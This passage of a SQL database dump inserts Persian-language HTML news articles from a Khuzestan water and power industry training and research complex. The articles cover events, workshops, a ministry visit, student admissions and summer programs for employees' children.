	<span dir="RTL">دفتر نوآوری مرکز علمی کاربردی صنعت آب و برق خوزستان اقدام به برگزاری رویداد شتاب ( استارتاپی) با عنوان &quot; طراحی محتواهای آموزشی و تبلیغاتی در صنعت آب و برق&quot; نمود. این رویداد در روز یکشنبه 21 اسفندماه 1401 در سالن جلسات دفتر ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید. هدف از برگزاری این رویداد جذب ایده های نوآورانه و خلاقانه در تولید محتواهای آموزشی، اطلاع رسانی مجموعه فعالیت های وزارت نیرو به جامعه و آگاهی بخشیدن به مردم در خصوص کاهش مصرف آب و انرژی می باشد. در این رویداد سه داور داخلی از گروه های آموزشی و سه داور مدعو از پارک علم و فناوری، مرکز رشد &nbsp;شهرستان دزفول و سازمان فنی و حرفه ای استان خوزستان برگزار گردید و در نهایت از میان ايده های شرکت کنندگان در رویداد سه ایده برتر توسط داوران انتخاب گردید.</span></p>
<p style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 1005px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_89.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; width: 500px;">
				<img alt="" src="wp-content/uploads/news-images/image_90.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_91.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_92.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>', '55201RePosterNews.jpg', 470, '1401/12/25', '1:16:58 PM', 1401, 'اسفند', 12, '25');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (56200, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'ارزیابی صلاحیت حرفه ای نیروی انسانی', '<p dir="RTL" style="margin-right: -8.5pt; text-align: justify;">
	ارزیابی صلاحیت حرفه ای نیروی انسانی مشاغل فنی و تخصصی 3 شرکت از شرکت های طرف پیمان سازمان آب و برق خوزستان</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="margin-right: -8.5pt; text-align: justify;">
	در راستای پیاده سازی نظام صلاحیت حرفه ای نیروی انسانی مشاغل فنی و تخصصی شرکت های پیمانکار سازمان آب و برق خوزستان، سطح الف سنجش و ارزیابی صلاحیت حرفه ای نیروی انسانی مشاغل فنی و تخصصی&quot; شرکت بهره برداری &nbsp;شبکه های آبیاری و زهکشی کارون بزرگ&quot;، &quot; شرکت بهره برداری از شبکه های آبیاری ناحیه شمال&quot; و &quot; شرکت تولید بهره برداری سد و نیروگاه کرخه برق آبی&quot; در حوزه مشاغل 21 گانه &quot;آبیاری و زهکشی&quot;، &quot; نیروگاه برق آبی&quot; و &quot;سد و کنترل پایداری&quot; با برنامه ریزی و حضور نمایندگان شرکت مدیریت منابع آب ایران، نماینده معاونت برنامه ریزی و رییس گروه آموزش سازمان و اعضای کارگروه صلاحیت حرفه ای سازمان توسط مجتمع عالی آموزشی و پژوهشی آب و برق خوزستان در محل شرکت های مذکور برگزار گردید.</p>
<p dir="RTL" style="margin-right: -8.5pt; text-align: justify;">
	این ارزیابی که در روزهای 20 الی 22 اسفند سال جاری برگزار گردید در مجموع382 نفر از شاغلین فنی و تخصصی شرکت های مذکور حضور داشتند.</p>
<p dir="RTL" style="margin-right: -8.5pt; text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 1005px">
	<tbody>
		<tr>
			<td style="text-align: center; width: 500px;">
				<img alt="" src="wp-content/uploads/news-images/image_93.jpeg" /></td>
			<td style="text-align: center; width: 5px;">
				&nbsp;</td>
			<td style="text-align: center; width: 500px;">
				<img alt="" src="wp-content/uploads/news-images/image_94.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_95.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_96.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_97.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_98.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_99.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_100.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_101.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_102.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_103.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_104.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_105.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_106.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_107.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_108.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '55202salahiyatnews.jpg', 364, '1401/12/27', '10:49:07 AM', 1401, 'اسفند', 12, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (56201, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'مجتمع در آیینه رمضان', '<p style="text-align: justify;">
	<span dir="RTL">شروع سال کاری 1402 و همزمانی با ماه روزه داری و خودسازی و همگامی بهار طبیعت با بهار قرآن ، فصل پر طراوت کار فرهنگی را در مجتمع به ارمغان آورد.</span></p>
', '<p dir="RTL">
	شروع سال کاری 1402 و همزمانی با ماه روزه داری و خودسازی و همگامی بهار طبیعت با بهار قرآن ، فصل پر طراوت کار فرهنگی را در مجتمع به ارمغان آورد که از جمله آنهاست:</p>
<p dir="RTL">
	1-انتشار الکترونیک (آلاء) ویژه نامه ماه مبارک رمضان در 30 شماره با عناوین : الف)&nbsp; علاج پرو پاگاندا&nbsp; &quot; تبیین &quot; است. ب- تفسیر 30 آیه از 30 جزء قرآن کریم&nbsp; ج-خوش اخلاقی (بیان نکات اخلاقی در کنار پاسخ به سؤالات مربوط به احکام روزه داری) د)مسابقه قرآنی&nbsp; (30 سؤال از 30 جزء قران&nbsp; به همراه 30 سؤال از متن&nbsp; 30 شماره ویژه نامه)و.....</p>
<p dir="RTL">
	2- جلسه ختم قرآن کریم &nbsp;با حضور همکاران ( قرائت 30 جزء قرآن )</p>
<p dir="RTL">
	3- احیای شب 27 ماه مبارک رمضان همراه با صرف سحری&nbsp;</p>
<p dir="RTL">
	4-سخنرانی امام جماعت مجتمع بین نماز ظهر و عصر&nbsp;</p>
<p dir="RTL">
	5- توزیع ارزاق رمضان بین همکاران ، به مناسبت میلاد کریم اهل بیت حضرت امام مجتبی (ع)</p>
<p>
	<span dir="RTL">6-شرکت اساتید ، دانشجویان&nbsp; و همکاران مجتمع در راهپیمایی عظیم روز قدس</span></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_109.jpeg" /></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_110.jpeg" /></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_111.jpeg" /></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_112.jpeg" /></p>
', '56201Start1402.jpg', 264, '1402/2/19', '12:52:54 PM', 1402, 'اردیبهشت', 2, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (56202, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری اردوی راهیان نور', '<p dir="RTL" style="text-align: justify;">
	اردوی راهیان نور به مقصد مناطق عملیاتی غرب کشور به اهتمام بسیج کارکنان سازمان آب و بق خوزستان و همکاری بسیج مجتمع برگزار شد.</p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	اردوی راهیان نور به مقصد مناطق عملیاتی غرب کشور به اهتمام بسیج کارکنان سازمان آب و بق خوزستان و همکاری بسیج مجتمع برگزار شد. در این اردوی چها روزه که در منطقه &quot;بازی دراز &quot; انجام شد، مسئول سمعی و بصری مجتمع ،پوشش صوتی و تصویری کاروان را برعهده داشتند.</p>
<p>
	&nbsp;</p>', '56202Rahian.jpg', 135, '1402/2/19', '1:04:34 PM', 1402, 'اردیبهشت', 2, '19');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57201, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری کارگاه تخصصی و آموزشی بازرسان', '<p dir="RTL" style="text-align: justify;">
	&nbsp;به اهتمام گروه آموزش های عمومی مجتمع کارگاه تخصصی و آموزشی بازرسان ماده 91 و 92 قانون مدیریت خدمات کشوری برگزار&nbsp; شد.</p>
<p>
	&nbsp;</p>', '<p dir="RTL" style="text-align: justify;">
	عبدالرسول فلاح زاده، مسئول راهبری واحدهای بازرسی دستگاههای اجرایی در سازمان اداری و استخدامی کشور و مدرس کارگاه تخصصی و آموزشی بازرسان ماده 91 و 92 قانون مدیریت خدمات &nbsp;با بیان اینکه دستگاه های اجرایی موظفند علاوه بر نظارت مستقیم مدیران از طریق انجام بازرسی های مستمر داخلی توسط بازرسان معتمد و متخصص در اجرای این ماده نظارت مستقیم نمایند افزود: چنانچه تخلف هریک از کارمندان مستند به گزارش حداقل یک بازرس معتمد به تایید مدیر مربوطه برسد، بالاترین مقام دستگاه اجرایی یا مقامات و مدیران مجاز، می توانند دستور اعمال کسر یک سوم از حقوق، مزایا و عناوین مشابه و یا انفصال از خدمات دولتی برای مدت یکماه تا یکسال را برای فرد متخلف صادر نمایند<span dir="LTR">.</span>وی ادامه داد: درصورت تکرار این تخلف به استناد گزارش هایی که به تائید بازرس معتمد و مدیر مربوطه برسد پرونده فرد خاطی به هیئت های رسیدگی به تخلفات اداری ارجاع و یکی از مجازات های بازخرید، اخراج و انفصال دائم از خدمات دولتی اعمال خواهد شد<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	مسئول راهبری واحدهای بازرسی دستگاههای اجرایی در سازمان اداری و استخدامی کشور با بیان اینکه دستگاه های اجرایی موظف است اسامی افراد حقیقی و حقوقی رشوه دهنده به کارمندان دستگاه های اجرایی را جهت ممنوعیت عقد قرارداد به کلیه دستگاه های اجرایی اعلام نماید افزود: سازمان موظف است اسامی افراد حقیقی و حقوقی رشوه دهنده به کارمندان دستگاه های اجرایی را جهت ممنوعیت عقد قرارداد به کلیه دستگاه های اجرایی اعلام نماید<span dir="LTR">.</span> وی در خصوص ماده 92 قانون مدیریت خدمات کشوری تصریح کرد: مدیران و سرپرستان بلافصل، مسئول نظارت و کنترل و حفظ روابط سالم کارمندان خود در انجام وظایف محوله می باشند و در مورد عملکرد آنان باید پاسخگو باشند<span dir="LTR">.</span> مدرس کارگاه تخصصی و آموزشی بازرسان ماده 91 و 92 قانون مدیریت خدمات کشوری افزود: در صورتی که کارمندان مزبور با اقدامات خود موجب ضرر و زیان دولت گردند و یا تخلفاتی نظیر رشوه و یا سوء استفاده در حیطه مدیریت مسئولان مزبور مشاهده و اثبات گردد، علاوه بر برخورد با کارمندان خاطی با مدیران و سرپرستان کارمندان (حسب مورد) نیزکه در کشف تخلف یا جرایم اهمال نموده باشند مطابق قوانین مربوط، با آنان رفتار خواهد شد.</p>
<p>
	&nbsp;</p>', '56205News4.jpg', 126, '1402/2/23', '9:40:20 AM', 1402, 'اردیبهشت', 2, '23');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57202, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'بازدید معاون وزارت نیرو از مجتمع', '<p dir="RTL" style="text-align: justify;">
	&nbsp;معاونت سرمایه انسانی ، تحقیقات&nbsp; و فن آوری اطلاعات وزارت نیرو از&nbsp; بخش های مختلف مجتمع بازدید کردند.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	معاونت سرمایه انسانی ، تحقیقات&nbsp; و فن آوری اطلاعات وزارت نیرو از&nbsp; بخش های مختلف مجتمع بازدید کردند.</p>
<p dir="RTL" style="text-align: justify;">
	خانم کارگر نجفی در پایان دیدار و در جلسه با هیئت امنا ی مجتمع و مدیرا ن آموزش شرکت ها در خصو ص ارتقای کیفیت آموزش بر&nbsp; چند نکته تاکید داشتند:</p>
<p dir="RTL" style="text-align: justify;">
	1- در حوزه انرژی های تجدید پذیر دوره های آموزشی تعریف شود.</p>
<p dir="RTL" style="text-align: justify;">
	2- مجتمع های آموزشی&nbsp; وزارت نیرو &nbsp;در پذیرش&nbsp; کار آموز از استان های دیگر کشور با یکدیگر تعامل داشته باشند(زیرا تغییر محل آموزش می تواند بهروری آموزش را ارتقا دهد)</p>
<p dir="RTL" style="text-align: justify;">
	3-دوره های آموزشی براساس نیاز های جدید تدوین شود.</p>
<p dir="RTL" style="text-align: justify;">
	4- تمرکز فعالیت &nbsp;مجتمع های آموزشی بر تربیت نیروهای متخصص باشد.</p>
<p dir="RTL" style="text-align: justify;">
	5- باید فضای محل آموزش برای متعلمین جاذبه داشته باشدو فضای آموزشی متفاوت از فضای اداری باشد.</p>
<p dir="RTL" style="text-align: justify;">
	6- امکانات و تجهیزات مجتمع خوزستان &nbsp;در آموزش های تخصصی، بیشتر از قبل مورد استفاده واقع شود.</p>
<p dir="RTL" style="text-align: justify;">
	7- با توجه به&nbsp; معدل سنوات خدمتی در مجتمع خوزستان ( که 23 سال می باشد) در کنار تجربه نیروهای موجود از ظرفیت نشاط و شادابی نیروهای جوان نیز بهره گرفته شود.</p>
', '57202Bazdid.jpg', 328, '1402/2/23', '9:51:30 AM', 1402, 'اردیبهشت', 2, '23');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57203, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور', '<p dir="RTL" style="text-align: justify;">
	مرکز آموزش علمی - کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برای مهر ماه سال 1402 بدون کنکور دانشجو می پذیرد<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	مرکز آموزش علمی - کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهر ماه سال 1402 با ظرفیت 13 رشته تحصیلی در <strong>مقاطع کاردانی و کارشناسی ناپیوسته،</strong> <strong>بدون کنکور</strong> دانشجو می پذیرد. علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های <span dir="LTR">06133340070</span> و 09378535157 تماس حاصل نموده و یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; رو به روی هتل نیشکر مراجعه نمایند<span dir="LTR">.</span></p>
<p dir="RTL" style="text-align: justify;">
	<span style="color:#ff0099;"><strong><span style="font-size:14px;">ثبت نام رشته های کارشناسی: ۲۸ خرداد لغایت ۴ تیر<br />
	ثبت نام رشته های کاردانی: ۱۸ تیر لغایت ۲۵ تیر</span></strong></span></p>
<p dir="RTL" style="text-align: justify;">
	<strong><span style="color:#800080;"><u>نحوه ثبت نام:</u><br />
	به صورت حضوری (بلوار گلستان بین خیابان کاشان و همدان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان) و یا از طریق سایت سازمان سنجش به نشانی: (www.sanjesh.org)</span></strong></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL">
	<span style="font-size:16px;"><span style="color:#ff8c00;"><u><strong>رشته های کارشناسی:</strong></u></span></span><br />
	<br />
	✅مهندسی فناوری ایمنی، سلامت و محیط زیست(HSE)<br />
	✅ مهندسی فناوری شبکه های توزیع برق<br />
	✅ مهندسی فناوری بهره برداری نیروگاه<br />
	✅ مهندسی فناوری اطلاعات<br />
	✅ مهندسی فناوری عمران آب و فاضلاب<br />
	✅ کارشناسی حرفه ای حسابداری مالی<br />
	<br />
	<span style="font-size:16px;"><span style="color:#ffa500;"><u><strong>رشته های کاردانی:</strong></u></span></span><br />
	<br />
	✅ کاردانی فنی ایمنی کار و حفاظت فنی<br />
	✅ کاردانی فنی برق-توزیع<br />
	✅ کاردانی فنی ابزار دقیق<br />
	✅ کاردانی فنی فناوری اطلاعات-اینترنت و شبکه های گسترده<br />
	✅ کاردانی حرفه ای مدیریت کسب و کار<br />
	✅ کاردانی حرفه ای حسابداری بهای تمام شده<br />
	✅ کاردانی حرفه ای گردشگری</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_113.jpeg" /></p>
<p>
	&nbsp;</p>
', '57203FreeKonkour.jpg', 901, '1402/3/20', '12:32:58 AM', 1402, 'خرداد', 3, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57204, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری سمینار جنبه های حقوقی و قراردادی پروژه های صنعتی', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان کارگاه آموزشی و ارزیابی با عنوان &quot;جنبه های حقوقی و قراردادی پروژه های صنعتی&quot; را چهارشنبه مورخ 31 خرداد ماه 1402 برگزار می نماید.</p>
<p>
	&nbsp;</p>', '<p style="text-align: justify;">
	<span dir="RTL">کارگاه آموزشی و ارزیابی با عنوان &quot; جنبه های حقوقی و قراردادی پروژه های صنعتی &quot; ساعت 8 بامداد 31 خرداد ماه 1402 در آمفی تئاتر سازمان آب و برق خوزستان جهت همکاران سازمان آب و برق و ساعت 13 همان روز در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق جهت همکاران شرکت های طرف قرارداد سازمان برگزار خواهد شد. مهمترین اهداف این کارگاه بررسی کلی و ارزیابی مشکلات و چالشهای قراردادی و حقوقی سازمان و شرکت ها می باشد و با توجه به مسائل و مشکلاتی که شرکت کنندگان در کارگاه مطرح می نمایند، موضوع و سرفصل کارگاههای بعدی تعریف خواهد گردید. </span></p>
<p style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_114.jpeg" /></p>', '57204Seminar.jpg', 399, '1402/3/24', '3:07:33 PM', 1402, 'خرداد', 3, '24');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57205, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'مشاهده اطلاعات محل آزمون های پایان ترم  دانشجویان', '<p>
	دانشجوی گرامی<br />
	با سلام<br />
	جهت مشاهده اطلاعات محل آزمون پایان ترم&nbsp; (شماره کلاس -شماره صندلی) از طریق لینک زیر اقدام نمایید:</p>
<p style="text-align: center;">
	<a href="https://kwphc.ir/ExamProgram.aspx">مشاهده اطلاعات محل آزمون های پایان ترم (شماره کلاس - شماره صندلی)</a></p>', '<p>
	دانشجوی گرامی<br />
	جهت مشاهده اطلاعات محل آزمون پایان ترم&nbsp; (شماره کلاس -شماره صندلی) از طریق لینک زیر اقدام نمایید:</p>
<p style="text-align: center;">
	<a href="https://kwphc.ir/ExamProgram.aspx">مشاهده اطلاعات محل آزمون های پایان ترم (شماره کلاس - شماره صندلی)</a></p>', '57205Azmoon1.jpg', 810, '1402/3/24', '3:44:53 PM', 1402, 'خرداد', 3, '24');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (57206, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'قابل توجه کارکنان صنعت آب و برق خوزستان', '<p dir="RTL">
	با سلام و احترام</p>
<p dir="RTL">
	جهت پیش ثبت نام دوره های آموزشی اوقات فراغت (فرزندان 7 تا 18 سال) از طریق لینک ذیل اقدام نمایید:</p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://kwphc.ir/summertime"><span style="font-size:14px;"><span style="color:#800080;">لینک ثبت نام</span></span></a></p>
<p>
	&nbsp;</p>
', '<p dir="RTL">
	با سلام و احترام</p>
<p dir="RTL">
	جهت پیش ثبت نام دوره های آموزشی اوقات فراغت (فرزندان 7 تا 18 سال) از طریق لینک ذیل اقدام نمایید:</p>
<p align="center" dir="RTL">
	<strong><span style="font-size:16px;"><a href="http://kwphc.ir/summertime"><span style="color:#800080;">لینک ثبت نام</span></a></span></strong></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_115.jpeg" /></p>
<p>
	&nbsp;</p>
', '57206Oqat.jpg', 1309, '1402/4/5', '4:24:33 PM', 1402, 'تیر', 4, '5');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (58205, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'اوقات فراغت تابستانه ویژه صنعت آب و برق خوزستان', '<p dir="RTL">
	فرزندان خانواده صنعت آب و برق خوزستان این تابستان مهمان مجتمع عالی آموزشی هستند.</p>
<p>
	&nbsp;</p>', '<p dir="RTL">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در قالب تفاهم نامه همکاری با دفتر امور فرهنگی و دینی سازمان آب و برق خوزستان اقدام به برگزاری دوره های آموزشی &ndash; مهارتی و ورزشی فرزندان صنعت آب وبرق خوزستان تابستانه نمود.</p>
<p dir="RTL">
	دوره های اوقات فراغت در سه بخش آموزشی، مهارتی و فرهنگی در فضای آموزشی مجتمع &nbsp;و ورزشی در مجموعه ورزشی بوستان خواهد بود، که با تفکیک جنسیت و به صورت مجزا در 4 رده سنی 7 تا 18 سال برنامه ریزی شد.</p>
<p dir="RTL">
	این دوره ها طبق نظر سنجی های به عمل آمده در رشته های حفظ موضوعی قرآن، نقاشی، فن بیان و مهارت ارتباطی، خوشنویسی با خودکار، تقویت اعتماد به نفس، آموزش پیش رانندگی، طراحی و آموزش کار با پهپاد و در رشته های ورزشی: فوتسال ، والیبال ، بسکتبال و آموزش شنا است.</p>
<p dir="RTL">
	مجتمع آموزشی به منظور تسهیل در تردد و راحتی شرکت کنندگان در این دوره ها با هماهنگی سازمان آب و برق خوزستان با یک شرکت معتبرجهت رفت و آمد، قراردادی منعقد نمود تا امکان رفت و آمد از درب منز تا محل برگزاری دوره ها فراهم شود.</p>
<p dir="RTL">
	طبق آمار اعلامی حدود 320نفر دختر و 310نفر پسر در برنامه ثبت نام کرده اند.</p>
<p dir="RTL">
	دکتر مهدی هودگر رئیس مجتمع آموزشی در این باره اشاره نمود: برنامه اوقات فراغت تابستانه فرزندان وزارت نیرو بحمداله شروع خوبی داشت ، این اولین سال اجرای چنین برنامه هایی در مجتمع آموزشی بود، اما با این وجود همکاران توانستند در کمترین زمان مشکلات پیش آمده را با هماهنگی های اولیه در حوزه برگزاری و تدارکات دوره ها مرتفع کنند.</p>
<p dir="RTL">
	دکتر هودگر ضمن قدر دانی از پرسنل مجتمع آموزشی افزود: قطعا اجرای با کیفیت و رضایت بخش را به تنهایی نمیتوانیم به دست بیاوریم و من از این طریق از خدمات و زحمات کلیه همکاران صنعت آب و برق خوزستان بالاخص مدیر عامل محترم سازمان آب و برق خوزستان جناب آقای مهندس صدریان فر که در این راستا نظرات کارشناسی و ارزشمندی ارائه نمودند و همکاری ویژه ای داشتند، سپاسگزارم.</p>
<p dir="RTL">
	وی همچنین از همکاران خدوم خدمات سازمان و مدیر عامل محترم شرکت ساب خوزستان جناب آقای مهندس یگانه و کادر زحمتکش و انقلابی امور فرهنگی و دینی سازمان آب و برق خوزستان نیز صمیمانه تشکر نمود.</p>
<p dir="RTL">
	ایشان در ادامه ضمن قدردانی از خانواده هایی که در برگزاری این پروژه همکاری و همیاری داشتند، تاکید کرد: مجموعه مدیران و پرسنل اجرایی برنامه اوقات فراغت فرزندان، برای شنیدن دیدگاه ها و نقد های دلسوزانه شما آماده است.</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_116.jpeg" /><img alt="" src="wp-content/uploads/news-images/image_117.jpeg" /><img alt="" src="wp-content/uploads/news-images/image_118.jpeg" /><img alt="" src="wp-content/uploads/news-images/image_119.jpeg" /><img alt="" src="wp-content/uploads/news-images/image_120.jpeg" /></p>
<p>
	&nbsp;</p>', '572072.jpg', 673, '1402/4/31', '11:37:40 AM', 1402, 'تیر', 4, '31');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (58206, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور', '<p dir="RTL">
	به اطلاع متقاضیان ثبت&zwnj; نام در پذیرش دوره های کاردانی و کارشناسی ناپیوسته می رساند،&nbsp;زمان ثبت &zwnj;نام در دوره های کاردانی از روز سه&zwnj;شنبه 7 شهریور لغایت دوشنبه 20 شهریور و ثبت&zwnj; نام در دوره های کارشناسی ناپیوسته از روز یکشنبه 5 شهریور لغایت دوشنبه مورخ 20 شهریورمی باشد<span dir="LTR">.</span><br />
	لذا داوطلبان واجد شرایط می&zwnj;توانند در مهلت مقرر برای ثبت نام از طریق درگاه اطلاع&zwnj;رسانی سازمان سنجش کشور به نشانی:<span dir="LTR"> www.sanjesh.org </span>اقدام نمایند<span dir="LTR">.</span></p>
<p style="text-align: justify;">
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	مرکز آموزش علمی - کاربردی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مهر ماه سال 1402 با ظرفیت 13 رشته تحصیلی در <strong>مقاطع کاردانی و کارشناسی ناپیوسته،</strong> <strong>بدون کنکور</strong> دانشجو می پذیرد. علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های <span dir="LTR">06133340070</span> و 06133340013&nbsp; تماس حاصل نموده و یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; رو به روی هتل نیشکر مراجعه نمایند</p>
<p dir="RTL" style="text-align: justify;">
	<span dir="LTR">.</span></p>
<p dir="RTL">
	<span style="font-size:16px;"><span style="color:#ff8c00;"><u><strong>رشته های کارشناسی:</strong></u></span></span><br />
	<br />
	✅مهندسی فناوری ایمنی، سلامت و محیط زیست(HSE) - <span style="color:#b22222;">کد رشته: 20610</span><br />
	✅ مهندسی فناوری شبکه های توزیع برق - <span style="color:#b22222;">کد رشته: 20100</span><br />
	✅ مهندسی فناوری بهره برداری نیروگاه - <span style="color:#b22222;">کد رشته: 20180</span><br />
	✅ مهندسی فناوری اطلاعات - <span style="color:#b22222;">کد رشته: 20381</span><br />
	✅ مهندسی فناوری عمران آب و فاضلاب - <span style="color:#b22222;">کد رشته: 20463</span><br />
	✅ کارشناسی حرفه ای حسابداری مالی - <span style="color:#b22222;">کد رشته: 20825</span><br />
	<br />
